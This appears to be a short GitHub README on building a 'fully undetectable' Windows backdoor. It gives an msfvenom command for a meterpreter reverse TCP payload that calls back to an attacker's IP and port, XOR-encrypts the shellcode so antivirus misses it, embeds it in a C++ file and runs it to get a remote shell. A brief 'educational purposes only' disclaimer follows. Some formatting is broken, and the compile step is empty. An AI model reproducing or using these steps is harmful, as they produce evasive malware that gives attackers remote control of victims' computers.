# 🔒 Generate **FUD** backdoor with a Python **Crypter** 🔒
Follow the steps bellow to generate a crypted shellcode that can be used on a C++ executable.


```

## Generate The ShellCode

```
msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=(IP) LPORT=(PORT) -f raw -o raw.txt
```

## Encode the ShellCode With the XOR Encryption

```
python2.7 xor_encryptor.py raw.txt > xor_shellcode.txt
```

## Add the crypted shellcode on main.cpp
Now that you have the encrypted shellcode you need to add it on the main.cpp file just like this:
```
char b[] = /*xor_shellcode*/
```

## Compile the main.cpp file

## Execute the backdoor
Now you can execute the backdoor and enjoy the metepreter shell

## DISCLAIMER

I am not responsible for any of your actions. This GitHub repository is made for educational purposes only!!!
